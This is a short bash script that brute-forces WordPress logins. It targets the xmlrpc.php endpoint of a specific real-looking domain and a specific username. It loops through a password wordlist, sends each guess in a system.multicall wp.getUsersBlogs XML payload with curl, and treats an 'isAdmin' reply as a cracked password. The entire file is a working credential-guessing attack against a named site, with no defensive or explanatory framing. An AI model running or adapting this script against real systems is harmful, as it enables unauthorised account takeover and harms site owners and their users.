#!/bin/bash

# Target URL
TARGET="https://hazercloud.com/xmlrpc.php"

# Username to target
USERNAME="6bqvq"

# Path to the password list
WORDLIST="/root/passwords.txt"

# Check if the password file exists
if [[ ! -f "$WORDLIST" ]]; then
    echo "Error: Password file $WORDLIST not found!"
    exit 1
fi

# Iterate through each password in the wordlist
while read -r PASSWORD; do
    echo "Trying password: $PASSWORD"

    # Define the XML payload using a heredoc
    PAYLOAD=$(cat <<EOF
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value>wp.getUsersBlogs</value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>${USERNAME}</value>
                        <value>${PASSWORD}</value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
EOF
)

    # Send the payload using curl
    RESPONSE=$(curl -s -d "$PAYLOAD" -H "Content-Type: text/xml" "$TARGET")

    # Check if the response contains a success indicator
    if echo "$RESPONSE" | grep -q "isAdmin"; then
        echo "Success! Username: $USERNAME, Password: $PASSWORD"
        exit 0
    else
        echo "Failed."
    fi
done < "$WORDLIST"

echo "Brute force attempt completed. No valid credentials found."
